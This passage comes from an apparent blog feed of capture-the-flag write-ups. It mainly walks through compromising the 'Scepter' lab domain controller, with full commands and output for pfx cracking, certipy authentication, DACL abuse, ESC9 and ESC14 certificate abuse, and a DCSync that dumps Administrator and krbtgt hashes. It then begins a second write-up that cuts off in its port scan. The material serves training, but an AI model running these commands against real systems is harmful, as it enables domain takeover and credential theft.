ZmljYXRpb25BdXRob3JpdHkwPAYDVR0RBDUwM6AfBgkrBgEEAYI3GQGgEgQQuQyF| jYzg20GS235CRJngkoIQZGMwMS5zY2VwdGVyLmh0YjBLBgkrBgEEAYI3GQIEPjA8| oDoGCisGAQQBgjcZAgGgLAQqUy0xLTUtMjEtNzQ4Nzk1NDYtOTE2ODE4NDM0LTc0| MDI5NTM2NS0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQCKy5wPeTrqhyCr9gEglZ8K| EKsHXZsfcQu35qHlaxyWxISCZ4CCDaD+MlTT6fnvw3oyF4Nd8ArI/QQwnqqPxxYk| 72HoVo835fo0lP3FeDfnbYT6rUMrv4QVkeJossDwnOnrZuGPtfUEWxNg1O76D2kU| gejyZzFgBcvaXAt/pEHVki2Zfdz7p1OAkbjP2cAsjFAAzdAZT1FpRdcL+s1PwZqd| urydtAwyuvSqyzDYJgt4aj0kdyNoFexNK2meqw5DdYWnrDTcBLdN4v37kKtMm2w1| 9X2shB2kglATgm0ULSz7jHVZNnACrxBBUsofMPVCvpsEBmfCb4zPo6a+oA0MjGsS|_-----END CERTIFICATE-----|_ssl-date: 2025-08-21T02:55:51+00:00; +1h34m31s from scanner time.2049/tcp open  nlockmgr      syn-ack ttl 127 1-4 (RPC #100021)3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)|_ssl-date: 2025-08-21T02:55:51+00:00; +1h34m31s from scanner time.| ssl-cert: Subject: commonName=dc01.scepter.htb| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:dc01.scepter.htb| Issuer: commonName=scepter-DC01-CA/domainComponent=scepter| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2024-11-01T03:22:33| Not valid after:  2025-11-01T03:22:33| MD5:   2af6:88f7:a6bf:ef50:9b84:3dc6:3df5:e018| SHA-1: cd9a:97ee:25c8:00ba:1427:c259:02ed:6e0d:9a21:7fd9| -----BEGIN CERTIFICATE-----| MIIGLDCCBRSgAwIBAgITYgAAACHTgl9VBArXxgAAAAAAITANBgkqhkiG9w0BAQsF| ADBIMRMwEQYKCZImiZPyLGQBGRYDaHRiMRcwFQYKCZImiZPyLGQBGRYHc2NlcHRl| cjEYMBYGA1UEAxMPc2NlcHRlci1EQzAxLUNBMB4XDTI0MTEwMTAzMjIzM1oXDTI1| MTEwMTAzMjIzM1owGzEZMBcGA1UEAxMQZGMwMS5zY2VwdGVyLmh0YjCCASIwDQYJ| KoZIhvcNAQEBBQADggEPADCCAQoCggEBALpnNbJF0dXLfbmd6n3LpJlQDKdwZdVT| JxqBS7Vz/LPj+ZpUA6JFTi31Jdy8qFqRF3HuBhsA5T+RPLGuhjoNAqMKqlWEcqOC| A4VHl99hLPKB0mpqSTVKIXzvvU2Aa2Pc42gGY4nmpODO06an3XddKCMdQx2dPXK+| /GUmsYPEszgoefAJLOaJ/ot23i1ffdcYE8c7xbi/ivUmLmOo6zQp/6FCRsJM4Ago| OZ0mV9tLt7jfltrNBL+Iq8FWoiV59ciaOmNLNwIo+JqkPjTYJNSuSsiaeVNUtoY1| yipUhhDOyX70wc48R20/So6PUOKnkGJ6ovrEQJCEpVBkic/eLlHaWbUCAwEAAaOC| AzowggM2MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFM+Zo2Ay| sKIDhRmsELT8JvcQ5qJEMB8GA1UdIwQYMBaAFOuQVDjSpmyJasttTaS6dRVgFSfj| MIHKBgNVHR8EgcIwgb8wgbyggbmggbaGgbNsZGFwOi8vL0NOPXNjZXB0ZXItREMw| MS1DQSxDTj1kYzAxLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxD| Tj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXNjZXB0ZXIsREM9aHRiP2Nl| cnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0| cmlidXRpb25Qb2ludDCBwQYIKwYBBQUHAQEEgbQwgbEwga4GCCsGAQUFBzAChoGh| bGRhcDovLy9DTj1zY2VwdGVyLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtl| eSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2Nl| cHRlcixEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRp| ZmljYXRpb25BdXRob3JpdHkwPAYDVR0RBDUwM6AfBgkrBgEEAYI3GQGgEgQQuQyF| jYzg20GS235CRJngkoIQZGMwMS5zY2VwdGVyLmh0YjBLBgkrBgEEAYI3GQIEPjA8| oDoGCisGAQQBgjcZAgGgLAQqUy0xLTUtMjEtNzQ4Nzk1NDYtOTE2ODE4NDM0LTc0| MDI5NTM2NS0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQCKy5wPeTrqhyCr9gEglZ8K| EKsHXZsfcQu35qHlaxyWxISCZ4CCDaD+MlTT6fnvw3oyF4Nd8ArI/QQwnqqPxxYk| 72HoVo835fo0lP3FeDfnbYT6rUMrv4QVkeJossDwnOnrZuGPtfUEWxNg1O76D2kU| gejyZzFgBcvaXAt/pEHVki2Zfdz7p1OAkbjP2cAsjFAAzdAZT1FpRdcL+s1PwZqd| urydtAwyuvSqyzDYJgt4aj0kdyNoFexNK2meqw5DdYWnrDTcBLdN4v37kKtMm2w1| 9X2shB2kglATgm0ULSz7jHVZNnACrxBBUsofMPVCvpsEBmfCb4zPo6a+oA0MjGsS|_-----END CERTIFICATE-----3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=dc01.scepter.htb| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:dc01.scepter.htb| Issuer: commonName=scepter-DC01-CA/domainComponent=scepter| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2024-11-01T03:22:33| Not valid after:  2025-11-01T03:22:33| MD5:   2af6:88f7:a6bf:ef50:9b84:3dc6:3df5:e018| SHA-1: cd9a:97ee:25c8:00ba:1427:c259:02ed:6e0d:9a21:7fd9| -----BEGIN CERTIFICATE-----| MIIGLDCCBRSgAwIBAgITYgAAACHTgl9VBArXxgAAAAAAITANBgkqhkiG9w0BAQsF| ADBIMRMwEQYKCZImiZPyLGQBGRYDaHRiMRcwFQYKCZImiZPyLGQBGRYHc2NlcHRl| cjEYMBYGA1UEAxMPc2NlcHRlci1EQzAxLUNBMB4XDTI0MTEwMTAzMjIzM1oXDTI1| MTEwMTAzMjIzM1owGzEZMBcGA1UEAxMQZGMwMS5zY2VwdGVyLmh0YjCCASIwDQYJ| KoZIhvcNAQEBBQADggEPADCCAQoCggEBALpnNbJF0dXLfbmd6n3LpJlQDKdwZdVT| JxqBS7Vz/LPj+ZpUA6JFTi31Jdy8qFqRF3HuBhsA5T+RPLGuhjoNAqMKqlWEcqOC| A4VHl99hLPKB0mpqSTVKIXzvvU2Aa2Pc42gGY4nmpODO06an3XddKCMdQx2dPXK+| /GUmsYPEszgoefAJLOaJ/ot23i1ffdcYE8c7xbi/ivUmLmOo6zQp/6FCRsJM4Ago| OZ0mV9tLt7jfltrNBL+Iq8FWoiV59ciaOmNLNwIo+JqkPjTYJNSuSsiaeVNUtoY1| yipUhhDOyX70wc48R20/So6PUOKnkGJ6ovrEQJCEpVBkic/eLlHaWbUCAwEAAaOC| AzowggM2MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFM+Zo2Ay| sKIDhRmsELT8JvcQ5qJEMB8GA1UdIwQYMBaAFOuQVDjSpmyJasttTaS6dRVgFSfj| MIHKBgNVHR8EgcIwgb8wgbyggbmggbaGgbNsZGFwOi8vL0NOPXNjZXB0ZXItREMw| MS1DQSxDTj1kYzAxLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxD| Tj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXNjZXB0ZXIsREM9aHRiP2Nl| cnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0| cmlidXRpb25Qb2ludDCBwQYIKwYBBQUHAQEEgbQwgbEwga4GCCsGAQUFBzAChoGh| bGRhcDovLy9DTj1zY2VwdGVyLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtl| eSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2Nl| cHRlcixEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRp| ZmljYXRpb25BdXRob3JpdHkwPAYDVR0RBDUwM6AfBgkrBgEEAYI3GQGgEgQQuQyF| jYzg20GS235CRJngkoIQZGMwMS5zY2VwdGVyLmh0YjBLBgkrBgEEAYI3GQIEPjA8| oDoGCisGAQQBgjcZAgGgLAQqUy0xLTUtMjEtNzQ4Nzk1NDYtOTE2ODE4NDM0LTc0| MDI5NTM2NS0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQCKy5wPeTrqhyCr9gEglZ8K| EKsHXZsfcQu35qHlaxyWxISCZ4CCDaD+MlTT6fnvw3oyF4Nd8ArI/QQwnqqPxxYk| 72HoVo835fo0lP3FeDfnbYT6rUMrv4QVkeJossDwnOnrZuGPtfUEWxNg1O76D2kU| gejyZzFgBcvaXAt/pEHVki2Zfdz7p1OAkbjP2cAsjFAAzdAZT1FpRdcL+s1PwZqd| urydtAwyuvSqyzDYJgt4aj0kdyNoFexNK2meqw5DdYWnrDTcBLdN4v37kKtMm2w1| 9X2shB2kglATgm0ULSz7jHVZNnACrxBBUsofMPVCvpsEBmfCb4zPo6a+oA0MjGsS|_-----END CERTIFICATE-----|_ssl-date: 2025-08-21T02:55:51+00:00; +1h34m31s from scanner time.5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.05986/tcp open  ssl/http      syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)| ssl-cert: Subject: commonName=dc01.scepter.htb| Subject Alternative Name: DNS:dc01.scepter.htb| Issuer: commonName=dc01.scepter.htb| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2024-11-01T00:21:41| Not valid after:  2025-11-01T00:41:41| MD5:   e84c:6894:816e:b7f5:4338:0a1f:a896:2075| SHA-1: 4e58:3799:020d:aaf4:d5ce:0c1e:76db:32cd:5a0e:28a7| -----BEGIN CERTIFICATE-----| MIIDLTCCAhWgAwIBAgIQYr4O5l5zSo9Nt/NWAsz/gDANBgkqhkiG9w0BAQsFADAb| MRkwFwYDVQQDDBBkYzAxLnNjZXB0ZXIuaHRiMB4XDTI0MTEwMTAwMjE0MVoXDTI1| MTEwMTAwNDE0MVowGzEZMBcGA1UEAwwQZGMwMS5zY2VwdGVyLmh0YjCCASIwDQYJ| KoZIhvcNAQEBBQADggEPADCCAQoCggEBALt+NmALaj8ktEddCkYyQCYPKE6NQUr1| jAgCUHPqlKlLvRsbWQmTe7R6GNp6oZotbipCeX3dK8URKg/cbiXspKoArfDtJMtL| NA3r3+sAS881NPYs+nxOZTQ3ZdLqQBWClXXTHHjg9eLySGOiEoOPtyE2ctw71MHn| yyrKW4JYLpI8SNqtjOXW3mXNrsHRbHU3AZ3nh+OrG8T8zWWs3BKGFYtg/8YBoXYE| EnLXJ7C+LRwJ+rEF3TLsYYIpSGb5LVgH/9HJ7x6gr7g4CZsdZ7/E+V5rlVa6Y3HU| Ta1q3mdme7nsEoBsB7GQJ7TCTtAL85T+Pd4gaxjqJrWkFzRx4dIyQX0CAwEAAaNt| MGswDgYDVR0PAQH/BAQDAgWgMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcD| ATAbBgNVHREEFDASghBkYzAxLnNjZXB0ZXIuaHRiMB0GA1UdDgQWBBQCeVUszMLJ| drdv7S3qV6FfMT7NOzANBgkqhkiG9w0BAQsFAAOCAQEASeFO9X3n9Xpj8GSocGrX| GfCyoIvPKHdO18JJVVkehshdXGBUyAlanX90vh5rrqPE2s9rDhqxSUfSl9+deOii| aAobzESCZNzvcqiz3IdRFtI+YP/Uz8PPRXdO8KQCPJ2jVLgo/GCuXfllooJJnhOT| ZYdRCCMCLNdudmhkwAO7EvwW4cDBhMaZy2GcpIP37yjZpwCvmdBVfN4R5Ra+265V| AnYngzq39K+rPSA/eMDHkaQ+q+hTj7XrVXqW8Uyecbw4lMqslZr5/fZJGZS6nmcI| 2UEYW/JnpvR02lAZjuoM+/Neu7fl2CEvAggG7vcu0M1TN44adcP3F5tnljuUdy3j| jw==|_-----END CERTIFICATE-----| tls-alpn:|_  http/1.1|_http-server-header: Microsoft-HTTPAPI/2.0|_ssl-date: 2025-08-21T02:55:51+00:00; +1h34m31s from scanner time.|_http-title: Not FoundService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| p2p-conficker:|   Checking for Conficker.C or higher...|   Check 1 (port 18337/tcp): CLEAN (Couldn&#x27;t connect)|   Check 2 (port 38986/tcp): CLEAN (Couldn&#x27;t connect)|   Check 3 (port 13248/udp): CLEAN (Timeout)|   Check 4 (port 38399/udp): CLEAN (Failed to receive data)|_  0/4 checks are positive: Host is CLEAN or ports are blocked| smb2-time:|   date: 2025-08-21T02:55:43|_  start_date: N/A| smb2-security-mode:|   3:1:1:|_    Message signing enabled and required|_clock-skew: mean: 1h34m30s, deviation: 0s, median: 1h34m30s

NFSLooking at this shows that helpdesk is available to mount.
konoha# showmount -e 10.10.11.65Export list for 10.10.11.65:/helpdesk (everyone)konoha# mount.nfs 10.10.11.65:/helpdesk someT -o nolockkonoha# ls someTbaker.crt  baker.key  clark.pfx  lewis.pfx  scott.pfx

Looking closer we can see if these have crackable hashes.
konoha# pfx2john clark.pfx &gt; clark.hashkonoha# john --wordlist=/usr/share/wordlists/rockyou.txt clark.hashUsing default input encoding: UTF-8Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 AVX 4x])Cost 1 (iteration count) is 2048 for all loaded hashesCost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 256 for all loaded hashesWill run 8 OpenMP threadsPress &#x27;q&#x27; or Ctrl-C to abort, almost any other key for statusnewpassword      (clark.pfx)

We can now craft a pfx with bakerâ€˜s key and cert.
konoha# openssl pkcs12 -export -out baker.pfx -inkey baker.key -in baker.crtEnter pass phrase for baker.key:Enter Export Password:Verifying - Enter Export Password:

Then we can retrieve d.bakerâ€˜s hash.
certipy auth -pfx baker.pfx -domain scepter.htb -dc-ip 10.10.11.65Certipy v4.8.2 - by Oliver Lyak (ly4k)[*] Using principal: d.baker@scepter.htb[*] Trying to get TGT...[*] Got TGT[*] Saved credential cache to &#x27;d.baker.ccache&#x27;[*] Trying to retrieve NT hash for &#x27;d.baker&#x27;[*] Got hash for &#x27;d.baker@scepter.htb&#x27;: aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce
Getting Dumped ðŸ˜žNow we can get a bloodhound dump and examine it.
nxc ldap scepter.htb -u d.baker -H 18b5fb0d99e7a475316213c15b6f22ce --dns-server 10.10.11.65 --bloodhound -c All
And when we do we find that d.baker has ForceChangePassword over a.carter. Letâ€™s exploit that!
bloodyAD -d scepter.htb -u d.baker -p :18b5fb0d99e7a475316213c15b6f22ce --dc-ip 10.10.11.65 --host scepter.htb set password a.carter PasswordsSuck![+] Password changed successfully!
Then we can look at a.carterâ€˜s access in bloodyAD as well as bloodhound.
konoha# bloodyAD -d scepter.htb -u a.carter -p &#x27;PasswordsSuck!&#x27; --dc-ip 10.10.11.65 --host scepter.htb get writabledistinguishedName: CN=Computers,DC=scepter,DC=htbpermission: CREATE_CHILD; WRITEdistinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=scepter,DC=htbpermission: WRITEdistinguishedName: CN=a.carter,CN=Users,DC=scepter,DC=htbpermission: WRITEdistinguishedName: OU=Staff Access Certificate,DC=scepter,DC=htbpermission: CREATE_CHILD; WRITEOWNER: WRITEDACL: WRITE
In bloodhound we can see this clearly.
So we can use bloodyAD.
konoha# bloodyAD -d scepter.htb -u a.carter -p &#x27;PasswordsSuck!&#x27; --dc-ip 10.10.11.65 --host scepter.htb add genericAll &#x27;OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB&#x27; &#x27;a.carter&#x27;[+] a.carter has now GenericAll on OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB
Or impacket, both get the job done.
impacket-dacledit -action &#x27;write&#x27; -rights &#x27;FullControl&#x27; -inheritance -principal &#x27;a.carter&#x27; -target-dn &#x27;OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB&#x27; &#x27;scepter.htb&#x27;/&#x27;a.carter&#x27;:&#x27;PasswordsSuck!&#x27;Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU[*] DACL backed up to dacledit-20250523-213935.bak[*] DACL modified successfully!
ADCSLooking at ADCS we with the users we control, we find something interesting with d.baker.
konoha# certipy find -dc-ip 10.10.11.65 -u d.baker@scepter -hashes :18b5fb0d99e7a475316213c15b6f22ce -stdout -vulnerableCertipy v5.0.2 - by Oliver Lyak (ly4k)&lt;SNIP&gt;Certificate Authorities  0    CA Name                             : scepter-DC01-CA    DNS Name                            : dc01.scepter.htb    Certificate Subject                 : CN=scepter-DC01-CA, DC=scepter, DC=htb    Certificate Serial Number           : 716BFFE1BE1CD1A24010F3AD0E350340    Certificate Validity Start          : 2024-10-31 22:24:19+00:00    Certificate Validity End            : 2061-10-31 22:34:19+00:00    Web Enrollment      HTTP        Enabled                         : False      HTTPS        Enabled                         : False    User Specified SAN                  : Disabled    Request Disposition                 : Issue    Enforce Encryption for Requests     : Enabled    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy    Permissions      Owner                             : SCEPTER.HTB\Administrators      Access Rights        ManageCa                        : SCEPTER.HTB\Administrators                                          SCEPTER.HTB\Domain Admins                                          SCEPTER.HTB\Enterprise Admins        ManageCertificates              : SCEPTER.HTB\Administrators                                          SCEPTER.HTB\Domain Admins                                          SCEPTER.HTB\Enterprise Admins        Enroll                          : SCEPTER.HTB\Authenticated UsersCertificate Templates  0    Template Name                       : StaffAccessCertificate    Display Name                        : StaffAccessCertificate    Certificate Authorities             : scepter-DC01-CA    Enabled                             : True    Client Authentication               : True    Enrollment Agent                    : False    Any Purpose                         : False    Enrollee Supplies Subject           : False    Certificate Name Flag               : SubjectAltRequireEmail                                          SubjectRequireDnsAsCn                                          SubjectRequireEmail    Enrollment Flag                     : AutoEnrollment                                          NoSecurityExtension    Extended Key Usage                  : Client Authentication                                          Server Authentication    Requires Manager Approval           : False    Requires Key Archival               : False    Authorized Signatures Required      : 0    Schema Version                      : 2    Validity Period                     : 99 years    Renewal Period                      : 6 weeks    Minimum RSA Key Length              : 2048    Template Created                    : 2024-11-01T02:29:00+00:00    Template Last Modified              : 2024-11-01T09:00:54+00:00    Permissions      Enrollment Permissions        Enrollment Rights               : SCEPTER.HTB\staff      Object Control Permissions        Owner                           : SCEPTER.HTB\Enterprise Admins        Full Control Principals         : SCEPTER.HTB\Domain Admins                                          SCEPTER.HTB\Local System                                          SCEPTER.HTB\Enterprise Admins        Write Owner Principals          : SCEPTER.HTB\Domain Admins                                          SCEPTER.HTB\Local System                                          SCEPTER.HTB\Enterprise Admins        Write Dacl Principals           : SCEPTER.HTB\Domain Admins                                          SCEPTER.HTB\Local System                                          SCEPTER.HTB\Enterprise Admins    [+] User Enrollable Principals      : SCEPTER.HTB\staff    [!] Vulnerabilities      ESC9                              : Template has no security extension.    [*] Remarks      ESC9         

Looks as we have ESC9, and as a.carter, we control d.baker.
konoha# bloodyAD -d scepter.htb -u a.carter -p &#x27;PasswordsSuck!&#x27; --dc-ip 10.10.11.65 --host scepter.htb get writabledistinguishedName: CN=Computers,DC=scepter,DC=htbpermission: CREATE_CHILD; WRITEdistinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=scepter,DC=htbpermission: WRITEdistinguishedName: CN=d.baker,OU=Staff Access Certificate,DC=scepter,DC=htbpermission: CREATE_CHILD; WRITEOWNER: WRITEDACL: WRITEdistinguishedName: CN=a.carter,CN=Users,DC=scepter,DC=htbpermission: WRITEdistinguishedName: OU=Staff Access Certificate,DC=scepter,DC=htbpermission: CREATE_CHILD; WRITEOWNER: WRITEDACL: WRITE
So we can set an attribute(mail) to a user we want control of. Looking at who has Remote Access, we can try h.brown. We can update d.bakerâ€˜s attribute to reflect that of h.brown.
bloodyAD -d scepter.htb -u a.carter -p PasswordsSuck! --dc-ip 10.10.11.65 --host scepter.htb set object d.baker mail -v &#x27;h.brown@scepter.htb&#x27;[+] d.baker&#x27;s mail has been updated
Then we request a cert using the StaffAccessTemplate using h.brown as the upn.
certipy req -username d.baker@scepter.htb -hashes :18b5fb0d99e7a475316213c15b6f22ce -dc-ip 10.10.11.65 -ca &#x27;scepter-DC01-CA&#x27; -template &#x27;StaffAccessCertificate&#x27; -ns 10.10.11.65 -target &#x27;DC01.scepter.htb&#x27; -target-ip 10.10.11.65 -upn &#x27;h.brown@scepter.htb&#x27;Certipy v4.8.2 - by Oliver Lyak (ly4k)[*] Requesting certificate via RPC[*] Successfully requested certificate[*] Request ID is 44[*] Got certificate without identification[*] Certificate has no object SID[*] Saved certificate and private key to &#x27;d.baker.pfx&#x27;

Finally, we authenticate with the pfx file, but using the username h.brown as identified in the upn.
certipy auth -pfx d.baker.pfx -domain scepter.htb -dc-ip 10.10.11.65 -username h.brownCertipy v4.8.2 - by Oliver Lyak (ly4k)[!] Could not find identification in the provided certificate[*] Using principal: h.brown@scepter.htb[*] Trying to get TGT...[*] Got TGT[*] Saved credential cache to &#x27;h.brown.ccache&#x27;[*] Trying to retrieve NT hash for &#x27;h.brown&#x27;[*] Got hash for &#x27;h.brown@scepter.htb&#x27;: aad3b435b51404eeaad3b435b51404ee:4ecf5242092c6fb8c360a08069c75a0c
Brown you slay me!On the box as h.brown, we can look around and find the user flag. Yet there wasnâ€™t much else. 
konoha# evil-winrm -i DC01.scepter.htb -u h.brown -r scepter.htbEvil-WinRM shell v3.7Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#x27; for module RelineData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completionWarning: User is not needed for Kerberos auth. Ticket will be usedInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:\Users\h.brown\Documents&gt;

We did have some other users, and p.adams looks interesting as they are in the Replication Operators group. Meaning, we get ahold of them, we can dcsync. We can look more at this user and what permissions we have as well. Which when we do we see we have WRITE over p.adams. 
konoha# bloodyAD -d scepter.htb -u h.brown -k --dc-ip 10.10.11.65 --host DC01.scepter.htb get writabledistinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=scepter,DC=htbpermission: WRITEdistinguishedName: CN=h.brown,CN=Users,DC=scepter,DC=htbpermission: WRITEdistinguishedName: CN=p.adams,OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htbpermission: WRITE
With the StaffAccessCertificate we saw it requires an email, so we can give it one but abusing weak explicit certificate mapping(ESC14). First, we need to update the altSecurityIdentities of p.adams. 
bloodyAD -d scepter.htb -u h.brown -k --dc-ip 10.10.11.65 --host DC01.scepter.htb set object p.adams altSecurityIdentities -v &#x27;X509:&lt;RFC822&gt;p.adams@scepter.htb&#x27;[+] p.adams&#x27;s altSecurityIdentities has been updated

Then point to that using our controlled user and updating their mail attribute accordingly.
bloodyAD -d scepter.htb -u a.carter -p PasswordsSuck! --dc-ip 10.10.11.65 --host scepter.htb set object d.baker mail -v &#x27;p.adams@scepter.htb&#x27;[+] d.baker&#x27;s mail has been updated
We spit in your general directionLastly, we can request a certificate using d.baker, but requesting with UPN p.adams.
certipy req -username d.baker@scepter.htb -hashes aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce -dc-ip 10.10.11.65 -ca &#x27;scepter-DC01-CA&#x27; -template &#x27;StaffAccessCertificate&#x27; -ns 10.10.11.65 -target &#x27;DC01.scepter.htb&#x27; -target-ip 10.10.11.65 -upn &#x27;p.adams@scepter.htb&#x27;Certipy v4.8.2 - by Oliver Lyak (ly4k)[*] Requesting certificate via RPC[*] Successfully requested certificate[*] Request ID is 51[*] Got certificate without identification[*] Certificate has no object SID[*] Saved certificate and private key to &#x27;d.baker.pfx&#x27;

Then we can finally authenticate with that pfx file with username p.adams.
certipy auth -pfx d.baker.pfx -domain scepter.htb -dc-ip 10.10.11.65 -username p.adamsCertipy v4.8.2 - by Oliver Lyak (ly4k)[!] Could not find identification in the provided certificate[*] Using principal: p.adams@scepter.htb[*] Trying to get TGT...[*] Got TGT[*] Saved credential cache to &#x27;p.adams.ccache&#x27;[*] Trying to retrieve NT hash for &#x27;p.adams&#x27;[*] Got hash for &#x27;p.adams@scepter.htb&#x27;: aad3b435b51404eeaad3b435b51404ee:1b925c524f447bb821a8789c4b118ce0
Too Many SecretsReplication Operators can just DCSYNC. So lets do that!!! ðŸ˜‚
impacket-secretsdump -dc-ip 10.10.11.65 -hashes aad3b435b51404eeaad3b435b51404ee:1b925c524f447bb821a8789c4b118ce0 &#x27;scepter.htb/p.adams&#x27;@scepter.htbImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)[*] Using the DRSUAPI method to get NTDS.DIT secretsAdministrator:500:aad3b435b51404eeaad3b435b51404ee:a291ead3493f9773dc615e66c2ea21c4:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:c030fca580038cc8b1100ee37064a4a9:::scepter.htb\d.baker:1106:aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce:::


]]></content>
      <categories>
        <category>htb</category>
      </categories>
      <tags>
        <tag>ADCS</tag>
        <tag>GenericAll</tag>
        <tag>DACL Abuse</tag>
        <tag>openssl</tag>
        <tag>ForceChangePassword</tag>
        <tag>ESC14</tag>
      </tags>
  </entry>
  <entry>
    <title>ShareThePainAD</title>
    <url>/2025/11/23/ShareThePainAD/</url>
    <content><![CDATA[
This Active Directory machine starts off with ZERO CREDENTIALS. So our initial scan shows us normal ports open for a server. We first check SMB to find we have guest auth to a â€˜Shareâ€™ directory. We have READ,WRITE to the directory. So after uploading a lnk file we capture the hash for bob.ross. Once a bloodhound dump is obtained, we find we have GenericAll to user alice.wonderland. We can do this a couple ways with entail setting a SPN and TargetedKerberoasting or change her password. This user alice.wonderland has access to the box being in Remote Management Users. After poking around some we find a SQL directory at C:\ but no access. Nevertheless, this is a older Windows Machine (Server 2022). Using CVE-2024-35250 to exploit at the kernel level we are able to obtain SYSTEM using msfconsole. 
Initial ScanPORT     STATE SERVICE       REASON          VERSION53/tcp   open  domain        syn-ack ttl 126 Simple DNS Plus88/tcp   open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2025-11-23 21:01:32Z)135/tcp  open  msrpc         syn-ack ttl 126 Microsoft Windows RPC139/tcp  open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn389/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hack.smarter0., Site: Default-First-Site-Name)445/tcp  open  microsoft-ds? syn-ack ttl 126464/tcp  open  kpasswd5?     syn-ack ttl 126593/tcp  open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0636/tcp  open  tcpwrapped    syn-ack ttl 1263268/tcp open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hack.smarter0., Site: Default-First-Site-Name)3269/tcp open  tcpwrapped    syn-ack ttl 1263389/tcp open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services| ssl-cert: Subject: commonName=DC01.hack.smarter| Issuer: 